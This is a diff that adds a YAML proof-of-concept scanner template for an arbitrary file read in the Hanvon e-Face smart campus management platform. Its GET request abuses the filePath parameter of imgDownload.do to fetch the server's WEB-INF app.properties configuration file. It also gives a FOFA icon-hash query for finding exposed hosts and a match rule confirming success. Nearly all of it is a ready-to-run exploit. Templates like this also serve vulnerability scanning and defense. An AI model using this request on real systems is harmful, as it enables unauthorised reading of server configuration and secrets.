@@ -1,0 +1,15 @@
+id: poc-yaml-hw-e-face-pass-spmp-imgdownload-do-anyfile-read
+info:
+  name: 汉王e脸通智慧园区管理平台 imgDownload.do 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: e脸通智慧园区管理平台
+  fofa: icon_hash="1380907357"
+requests:
+- method: GET
+  path: /manage/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/classes/app.properties&recoToken=ZuZBOrvLG8M
+  expression: status_code == 200 && contains(body,"是否开启调试模式") && contains(body,"server.version=")
+    && contains(body,"server.url=") && contains(content_type,"image")
+variables: {}
+transport: http
